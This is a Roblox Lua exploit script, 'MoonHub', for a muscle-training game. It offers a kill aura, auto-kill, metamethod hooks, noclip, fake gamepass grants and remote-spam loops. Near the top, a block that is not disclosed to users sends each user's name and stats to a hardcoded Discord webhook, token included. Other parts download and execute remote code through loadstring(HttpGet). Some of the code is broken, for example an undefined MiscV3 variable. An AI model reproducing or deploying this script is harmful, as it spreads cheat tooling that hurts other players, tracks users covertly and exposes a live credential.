-- Define the blacklist of users (Roblox UserIDs or usernames)
local blacklist = {
    [123456789] = true,  -- Example UserID
    ["HoloGrindz"] = true, -- Example username (if using usernames)
    ["RYU_5K8"] = true-- Add more UserIDs or usernames as needed
}

-- Function to check if a user is blacklisted
local function isUserBlacklisted(userId, username)
    return blacklist[userId] == true or blacklist[username] == true
end

-- Function to handle player joining
local function onPlayerAdded(player)
    local userId = player.UserId
    local username = player.Name

    -- Check if the player is blacklisted
    if isUserBlacklisted(userId, username) then
        player:Kick("Fuck off IP logger")
        return
    end

    -- If not blacklisted, allow them to continue in the game
    print("Welcome, " .. username .. "! You can use this script")
    -- Add the rest of your game logic here
end

-- Connect the PlayerAdded event to the function
game.Players.PlayerAdded:Connect(onPlayerAdded)



-- Discord 
-- Webhook URL 
local webhookUrl = "https://discord.com/api/webhooks/1359418893290045470/tSE9caMSSlP6XbYwYKoQ5TRJCW2yDSjCYxqbEVj-8l84p4y3ts-yhbuZ7_jeOSEBEDM_" 

-- Get Player Info 
local player = game:GetService("Players").LocalPlayer 
local leaderstats = player:FindFirstChild("leaderstats") 

-- Get Stats 
local username = player.Name 
local strength = leaderstats and leaderstats:FindFirstChild("Strength") and leaderstats.Strength.Value or "N/A" 
local durability = player:FindFirstChild("Durability") and player.Durability.Value or "N/A" 
local agility = player:FindFirstChild("Agility") and player.Agility.Value or "N/A" 
local rebirths = leaderstats and leaderstats:FindFirstChild("Rebirths") and leaderstats.Rebirths.Value or "N/A" 
local gems = player:FindFirstChild("Gems") and player.Gems.Value or "N/A" 

-- Create Embed Data 
local data = { 
    ["embeds"] = {{ 
        ["title"] = "Player Stats", 
        ["color"] = tonumber(000000), -- Green color 
        ["fields"] = { 
            {["name"] = "Username", ["value"] = username, ["inline"] = true}, 
            {["name"] = "Strength", ["value"] = tostring(strength), ["inline"] = true}, 
            {["name"] = "Durability", ["value"] = tostring(durability), ["inline"] = true}, 
            {["name"] = "Agility", ["value"] = tostring(agility), ["inline"] = true}, 
            {["name"] = "Rebirths", ["value"] = tostring(rebirths), ["inline"] = true}, 
            {["name"] = "Gems", ["value"] = tostring(gems), ["inline"] = true} 
        } 
    }} 
} 

-- Convert to JSON 
local HttpService = game:GetService("HttpService") 
local body = HttpService:JSONEncode(data) 
local headers = {["Content-Type"] = "application/json"} 

-- Send Request (Supports Different Exploits) 
local function sendWebhook() 
    if request then 
        request({Url = webhookUrl, Method = "POST", Headers = headers, Body = body}) 
    elseif http_request then 
        http_request({Url = webhookUrl, Method = "POST", Headers = headers, Body = body}) 
    elseif syn and syn.request then 
        syn.request({Url = webhookUrl, Method = "POST", Headers = headers, Body = body}) 
    else 
        warn("No suitable HTTP request method found.") 
    end 
end 

sendWebhook() 



local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/memejames/elerium-v2-ui-library/main/Library", true))()

local window = library:AddWindow("MoonHub-Elerium-Public", {
    main_color = Color3.fromRGB(0, 0, 0), -- GUI color
    min_size = Vector2.new(470, 470), -- Size of the GUI
    can_resize = false,
})

local Main = window:AddTab("Main")
local folder = Main:AddFolder("Misc")

-- Variable Definitions
local toggles = {}
local isAutoFarming = false
_G.autoKillActive = false
local killMethod = "Teleport"
local infiniteRebirthLoop

-- Function for toggles initialization
local function initializeToggles()
    local toggleNames = {
        "autoJoinToggleBrawl", "autoJoinToggleBrawlGOD", "matrixkillaura",
        "fasttools", "autoweight", "autopushups", "autositups",
        "autohandstands", "autofrostrock", "spinwheel",
        "antiaccepttrade", "antirebirth", "autopunch",
        "autopunchfast", "autokillall", "autorebirthinfinite",
        "autorebirthtarget", "hideallframes", "autosize2"
    }
    for _, name in ipairs(toggleNames) do
        toggles[name] = false
    end
end

initializeToggles()
local whitelist = {}

-- Functions and Button Bindings
-- Auto-join Brawl switch
folder:AddSwitch("Auto Join Brawl", function(state)
    toggles.autoJoinToggleBrawl = state
    if state then
        task.spawn(function()
            while toggles.autoJoinToggleBrawl do
                game:GetService("ReplicatedStorage").rEvents.brawlEvent:FireServer("joinBrawl")
                task.wait(2)
            end
        end)
    end
end)

-- Auto-join Brawl GOD switch
folder:AddSwitch("Auto Join Brawl GOD", function(state)
    toggles.autoJoinToggleBrawlGOD = state
    if state then
        task.spawn(function()
            while toggles.autoJoinToggleBrawlGOD do
                game:GetService("ReplicatedStorage").rEvents.brawlEvent:FireServer("joinBrawl")
                task.wait(0.5)
            end
        end)
    end
end)

folder:AddButton("Anti AFK", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/evxncodes/mainroblox/main/anti-afk", true))()
end)

folder:AddButton("Infinite Yield", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/DarkNetworks/Infinite-Yield/main/latest.lua'))()
end)

folder:AddButton("FREE Auto Lift Pass", function()
    local gamepassFolder = game:GetService("ReplicatedStorage").gamepassIds
    local player = game.Players.LocalPlayer
    for _, gamepass in pairs(gamepassFolder:GetChildren()) do
        local value = Instance.new("IntValue")
        value.Name = gamepass.Name
        value.Value = gamepass.Value
        value.Parent = player.ownedGamepasses
    end
end)

-- Matrix Kill Aura
folder:AddSwitch("Matrix Kill Aura", function(state)
    toggles.matrixkillaura = state
    if state then
        getgenv().killNearby = true
        -- Define the visual part representing the kill radius
        local radiusVisual = Instance.new("Part")
        radiusVisual.Anchored = true
        radiusVisual.CanCollide = false
        radiusVisual.Transparency = 0.8
        radiusVisual.Material = Enum.Material.ForceField
        radiusVisual.Color = Color3.fromRGB(225, 0, 0)
        radiusVisual.Size = Vector3.new(1, 0.1, 1)
        radiusVisual.Parent = workspace

        task.spawn(function()
            while getgenv().killNearby do
                pcall(function()
                    local myCharacter = game.Players.LocalPlayer.Character
                    local myRoot = myCharacter and myCharacter:FindFirstChild("HumanoidRootPart")
                    if myRoot then
                        local currentRadius = 10
                        radiusVisual.Size = Vector3.new(currentRadius * 10, 0.40, currentRadius * 10)
                        radiusVisual.CFrame = myRoot.CFrame * CFrame.new(0, -2, 0)

                        for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                            if player ~= game.Players.LocalPlayer then
                                local char = player.Character
                                local root = char and char:FindFirstChild("HumanoidRootPart")
                                if root and (root.Position - myRoot.Position).Magnitude <= currentRadius then
                                    local killEffect = Instance.new("Part")
                                    killEffect.Anchored = true
                                    killEffect.CanCollide = false
                                    killEffect.Transparency = 0.5
                                    killEffect.Material = Enum.Material.Neon
                                    killEffect.Color = Color3.fromRGB(0, 0, 0)
                                    killEffect.CFrame = root.CFrame
                                    killEffect.Size = Vector3.new(5, 5, 5)
                                    killEffect.Parent = workspace

                                    -- Tweening effect for kill effect
                                    game:GetService("TweenService"):Create(killEffect, TweenInfo.new(0.5), {
                                        Size = Vector3.new(0, 0, 0),
                                        Transparency = 1
                                    }):Play()

                                    game:GetService("Debris"):AddItem(killEffect, 0.5)
                                    firetouchinterest(root, myCharacter.LeftHand, 0)
                                    task.wait()
                                    firetouchinterest(root, myCharacter.LeftHand, 1)
                                end
                            end
                        end
                        task.wait(0.1)
                    end
                end)
                task.wait(0.1)
            end
            radiusVisual:Destroy()
        end)
    else
        getgenv().killNearby = false
    end
end)

folder:AddSwitch("Fast Tools", function(state)
    toggles.fasttools = state
    local speed = state and 0 or 0.35
    local player = game.Players.LocalPlayer
    local backpack = player:WaitForChild("Backpack")

    local toolsSpeed = {
        {"Punch", "attackTime", speed},
        {"Ground Slam", "attackTime", state and 0 or 6},
        {"Stomp", "attackTime", state and 0 or 7},
        {"Handstands", "repTime", speed},
        {"Pushups", "repTime", speed},
        {"Weight", "repTime", speed},
        {"Situps", "repTime", speed}
    }

    for _, toolInfo in ipairs(toolsSpeed) do
        local tool = backpack:FindFirstChild(toolInfo[1]) or (player.Character and player.Character:FindFirstChild(toolInfo[1]))
        if tool and tool:FindFirstChild(toolInfo[2]) then
            tool[toolInfo[2]].Value = toolInfo[3]
        end
    end
end)

folder:AddButton("Destroy AD portal", function()
        local part = workspace:FindFirstChild("RobloxForwardPortals")
    if part then
        part:Destroy()
    end
end)

-- Create second folder
local folder2 = Main:AddFolder("Misc V2")

folder2:AddSwitch("Auto SpinWheel", function(state)
    toggles.spinwheel = state
    if state then
        task.spawn(function()
            while toggles.spinwheel do
                game:GetService("ReplicatedStorage").rEvents.openFortuneWheelRemote:InvokeServer("openFortuneWheel", game:GetService("ReplicatedStorage").fortuneWheelChances["Fortune Wheel"])
                task.wait(1)
            end
        end)
    end
end)

folder2:AddButton("Claim all chests", function()
    task.spawn(function()
        while true do
            for i = 1, 8 do
                game:GetService("ReplicatedStorage").rEvents.freeGiftClaimRemote:InvokeServer("claimGift", i)
            end
            task.wait(1)
        end
    end)
end)

folder2:AddSwitch("Anti Accept Trade", function(state)
    toggles.antiaccepttrade = state
    if state then
        local OldNameCall
        OldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
            local Args = {...}
            if self.Name == "tradingEvent" and Args[1] == "acceptTrade" then
                return
            end
            return OldNameCall(self, unpack(Args))
        end)
    else
        if OldNameCall then
            hookmetamethod(game, "__namecall", OldNameCall)
            OldNameCall = nil
        end
    end
end)

folder2:AddButton("Auto Eat Ultra Eggs", function()
    _G.AutoEgg = true 
    task.spawn(function()
        while _G.AutoEgg do
            local boostFolder = game.Players.LocalPlayer:FindFirstChild("boostersfolder")
            if boostFolder then
                local eggTimer = boostFolder:FindFirstChild("Ultra Shake")
                if not eggTimer or (eggTimer and tonumber(eggTimer.Value) <= 2) then
                    -- Check if useOneEgg function is defined elsewhere in your code
                    if useOneEgg then  -- Ensure useOneEgg function is defined
                        useOneEgg()  
                    end
                end
            end
            task.wait(1)
        end
    end)
end)

folder2:AddSwitch("Anti Rebirth", function(state)
    toggles.antirebirth = state
    if state then
        local OldNameCall
        OldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
            local Args = {...}
            if self.Name == "rebirthRemote" and Args[1] == "rebirthRequest" then
                return
            end
            return OldNameCall(self, unpack(Args))
        end)
    else
        if OldNameCall then
            hookmetamethod(game, "__namecall", OldNameCall)
            OldNameCall = nil
        end
    end
end)

local folderMiscV3 = MiscV3:AddFolder("Misc V3") -- Fixed variable name

folderMiscV3:AddSwitch("Infinite Jump", function(state)
    infinitejump = state
    if infinitejump then
        _G.InfiniteJump = true -- Set InfiniteJump to true when enabled
        local Player = game:GetService('Players').LocalPlayer
        local UserInputService = game:GetService('UserInputService')
        
        UserInputService.JumpRequest:Connect(function()
            if _G.InfiniteJump then
                Player.Character:FindFirstChildOfClass('Humanoid'):ChangeState('Jumping')
            end
        end)
    else
        _G.InfiniteJump = false -- Reset when disabled
    end
end)

folderMiscV3:AddSwitch("Noclip", function(state)
    noclip = state
    local RunService = game:GetService("RunService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    if noclip then
        -- Start noclip when enabled
        getgenv().noclipConnection = RunService.Stepped:Connect(function()
            for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end)
    else
        -- Stop noclip when disabled
        if getgenv().noclipConnection then
            getgenv().noclipConnection:Disconnect()
            getgenv().noclipConnection = nil -- Clean up the variable after disconnecting
        end
    end
end)
--------------------------------------------------------------------------------
-- Auto Weight Tab
local AutoWeight = window:AddTab("Auto Weight")
local folderWeight = AutoWeight:AddFolder("Auto Tools")

local function createAutoCallback(actionName, toolName)
    folderWeight:AddSwitch(actionName, function(state)
        toggles[actionName] = state
        if state then
            local tool = game.Players.LocalPlayer.Backpack:FindFirstChild(toolName)
            if tool then
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
                while toggles[actionName] do
                    game.Players.LocalPlayer.muscleEvent:FireServer("rep")
                    task.wait(0.001)
                end
                
                -- Unequip tool when turning off
                local character = game.Players.LocalPlayer.Character
                if character and character:FindFirstChild(toolName) then
                    character[toolName].Parent = game.Players.LocalPlayer.Backpack
                end
            end
        end
    end)
end

createAutoCallback("Auto Weight", "Weight")
createAutoCallback("Auto Pushups", "Pushups")
createAutoCallback("Auto Situps", "Situps")
createAutoCallback("Auto Handstands", "Handstands")

local AutoKill = window:AddTab("Auto Kill")
local folderAutoPunch = AutoKill:AddFolder("Auto Punch")

folderAutoPunch:AddSwitch("Auto Punch Normal", function(state)
    toggles.autopunch = state
    _G.fastHitActive = state  -- Set global variable based on the switch state

    if state then
        local function equipAndModifyPunch()
            local player = game.Players.LocalPlayer
            while _G.fastHitActive do
                local punch = player.Backpack:FindFirstChild("Punch")
                if punch then
                    punch.Parent = player.Character
                    if punch:FindFirstChild("attackTime") then
                        punch.attackTime.Value = 0
                    end
                end
                task.wait(0)
            end
            -- Unequip when done
            local character = player.Character
            if character and character:FindFirstChild("Punch") then
                character.Punch.Parent = player.Backpack
            end
        end
        coroutine.wrap(equipAndModifyPunch)()
    end
end)

folderAutoPunch:AddSwitch("Auto Punch FAST", function(state)
    toggles.autopunchfast = state  -- Use local variable for autopunchfast
    _G.fastHitActive = state  -- Set global variable based on the switch state

    if state then
        local function equipAndModifyPunch()
            while _G.fastHitActive do
                local player = game.Players.LocalPlayer
                local punch = player.Backpack:FindFirstChild("Punch")
                if punch then
                    punch.Parent = player.Character  -- Equip punch tool
                    if punch:FindFirstChild("attackTime") then
                        punch.attackTime.Value = 0  -- Set attack time to zero
                    end
                end
                task.wait(0)  -- Small wait to avoid freezing the script
            end
        end

        local function rapidPunch()
            while _G.fastHitActive do
                local player = game.Players.LocalPlayer
                player.muscleEvent:FireServer("punch", "rightHand")
                player.muscleEvent:FireServer("punch", "leftHand")

                local character = player.Character
                if character then
                    local punchTool = character:FindFirstChild("Punch")
                    if punchTool then
                        punchTool:Activate()  -- Activate the punch tool
                    end
                end
                task.wait(0)  -- Small wait to avoid too many requests
            end
        end

        coroutine.wrap(equipAndModifyPunch)()  -- Start equip and modify coroutine
        coroutine.wrap(rapidPunch)()  -- Start rapid punch coroutine
    else
        -- If autopunch is false, return the punch tool to the backpack
        local character = game.Players.LocalPlayer.Character
        if character then
            local equipped = character:FindFirstChild("Punch")
            if equipped then
                equipped.Parent = game.Players.LocalPlayer.Backpack  -- Unequip punch tool
            end
        end
        print("Auto Punch Off")
    end
end)

-- Auto Kill switch
local folderAutoKill = AutoKill:AddFolder("Auto Kill")

folderAutoKill:AddSwitch("Auto Kill", function(state)
    toggles.autokillall = state
    if state then
        _G.autoKillActive = false
        local function autoKill()
            _G.autoKillActive = true
            local player = game.Players.LocalPlayer
            while _G.autoKillActive do
                task.wait()
                for _, otherPlayer in pairs(game.Players:GetPlayers()) do
                    if otherPlayer.Name ~= player.Name and not table.find(whitelist, otherPlayer.Name) then
                        local character = game.Workspace:FindFirstChild(otherPlayer.Name)
                        local localCharacter = player.Character
                        if character and localCharacter then
                            local leftHand = localCharacter:FindFirstChild("LeftHand")
                            if leftHand then
                                local head = character:FindFirstChild("Head")
                                if head then
                                    head.CFrame = leftHand.CFrame
                                end
                                for _, descendant in pairs(character:GetDescendants()) do
                                    if descendant:IsA("BasePart") and descendant.Name == "Handle" then
                                        descendant.CFrame = leftHand.CFrame
                                    end
                                end
                                local sweatPart = character:FindFirstChild("sweatPart")
                                if sweatPart then
                                    sweatPart.CFrame = leftHand.CFrame
                                end
                            end
                        end
                    end
                end
            end
        end
        coroutine.wrap(autoKill)()
    else
        _G.autoKillActive = false
    end
end)

local dropdownKillMethod = folderAutoKill:AddDropdown("Select Kill Method", function(method)
    killMethod = method
    print("Kill Method set to:", method)
end)

dropdownKillMethod:Add("Teleport")
dropdownKillMethod:Add("Non-Teleport")

-- Handle fastest kill switch
folderAutoKill:AddSwitch("Fastest Kill", function(state)
    local player = game.Players.LocalPlayer
    local punch = player.Backpack:FindFirstChild("Punch")
    local character = player.Character
    local punch1 = character and character:FindFirstChild("Punch")

    local attackTimeValue = state and 0 or 0.35

    if punch and punch:FindFirstChild("attackTime") then
        punch.attackTime.Value = attackTimeValue
    end

    if punch1 and punch1:FindFirstChild("attackTime") then
        punch1.attackTime.Value = attackTimeValue
    end
end)

local dropdownWhitelist = folderAutoKill:AddDropdown("Whitelist Players", function(selectedPlayer)
    if not table.find(whitelist, selectedPlayer) then
        table.insert(whitelist, selectedPlayer)
    else
        for i, name in ipairs(whitelist) do
            if name == selectedPlayer then
                table.remove(whitelist, i)
                break
            end
        end
    end
    print("Updated Whitelist:", table.concat(whitelist, ", "))
end)

for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
    if otherPlayer.Name ~= game.Players.LocalPlayer.Name then
        dropdownWhitelist:Add(otherPlayer.Name)
    end
end

game.Players.PlayerAdded:Connect(function(newPlayer)
    if newPlayer.Name ~= game.Players.LocalPlayer.Name then
        dropdownWhitelist:Add(newPlayer.Name)
    end
end)

game.Players.PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer.Name ~= game.Players.LocalPlayer.Name then
        dropdownWhitelist:Remove(leavingPlayer.Name)
    end
end)

--------------------------------------------------------------------------------
-- Auto Rebirth Tab
local AutoRebirth = window:AddTab("Auto Rebirth")
local folderAutoRebirth = AutoRebirth:AddFolder("Auto Rebirth")

folderAutoRebirth:AddSwitch("Auto Rebirth", function(state)
    toggles.autorebirthinfinite = state
    if state then
        infiniteRebirthLoop = task.spawn(function()
            while task.wait(0.1) do
                game:GetService("ReplicatedStorage").rEvents.rebirthRemote:InvokeServer("rebirthRequest")
            end
        end)
    else
        if infiniteRebirthLoop then
            task.cancel(infiniteRebirthLoop)
            infiniteRebirthLoop = nil
        end
    end
end)



folderAutoRebirth:AddSwitch("Hide All Frames", function(state)
    toggles.hideallframes = state
    local rSto = game:GetService("ReplicatedStorage")
    for _, obj in pairs(rSto:GetChildren()) do
        if obj.Name:match("Frame$") then
            obj.Visible = not state
        end
    end
end)

folderAutoRebirth:AddSwitch("Auto Size 2", function(state)
    toggles.autosize2 = state
    local autoSizeLoop
    if state then
        autoSizeLoop = task.spawn(function()
            while task.wait(0) do
                game:GetService("ReplicatedStorage").rEvents.changeSpeedSizeRemote:InvokeServer("changeSize", 2)
            end
        end)
    else
        if autoSizeLoop then
            task.cancel(autoSizeLoop)
            autoSizeLoop = nil
        end
    end
end)



local rebirthTab = AutoRebirth:AddFolder("Rebirth Functions") -- Create the rebirth tab

-- Initialize a boolean to track if auto-rebirth is targeted
local toggles = { autorebirthtarget = false }
local targetRebirthAmount = nil

folderAutoRebirth:AddSwitch("Auto Rebirth Target", function(state)
    toggles.autorebirthtarget = state
    if state then
        local autoRebirthState = false

        rebirthTab:AddTextBox("Target Rebirth Amount", function(value)
            targetRebirthAmount = tonumber(value)
            if not targetRebirthAmount or targetRebirthAmount < 0 then
                print("Please enter a valid target rebirth amount.")
                targetRebirthAmount = nil
            end
        end, {
            clear = false,
            placeholder = "Enter target rebirth amount"
        })

        local autoRebirthToggle = rebirthTab:AddSwitch("Auto Rebirth", function(state)
            autoRebirthState = state
            if state then
                coroutine.wrap(function()
                    print("Auto Rebirth enabled")
                    while autoRebirthState do
                        local player = game.Players.LocalPlayer
                        local rebirths = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Rebirths")
                        if rebirths and targetRebirthAmount then
                            if rebirths.Value >= targetRebirthAmount then
                                print("Target rebirth amount reached:", rebirths.Value)
                                autoRebirthState = false
                            else
                                game:GetService("ReplicatedStorage").rEvents.rebirthRemote:InvokeServer("rebirthRequest")
                            end
                        end
                        task.wait(0.4)
                    end
                    print("Auto Rebirth disabled")
                end)()
            else
                print("Auto Rebirth disabled")
            end
        end)

        rebirthTab:AddButton("Set Rebirth", function()
            local rebirthRemote = game:GetService("ReplicatedStorage").rEvents.rebirthRemote
            local player = game.Players.LocalPlayer
            local leaderstats = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Rebirths")
            if leaderstats and leaderstats.Value > 189800 then
                task.wait(0.33) -- Wait for a short duration
                rebirthRemote:InvokeServer("rebirthRequest")
            end
            print("Rebirth set if conditions met")
        end)
    end
end)


local Credits = window:AddTab("Credits")

Credits:AddLabel("Paid Version, 500 Robux")
Credits:AddLabel("Script Made By Godlike")
Credits:AddLabel("HUGE SHOUTOUT TO MOHA FOR ASSISTANCE")
Credits:AddLabel("The paid version contains: fast rebirth, fast strength, soon fast glitch, better fast kill")
Credits:AddLabel("Join MoonHub discord server Via youtube: @MoonLight_H3LL")
Credits:AddLabel("Will be more updates!!!")
Credits:AddLabel("Thank u for using MoonHub")
Credits:AddLabel("JOIN H3LL ARMY")
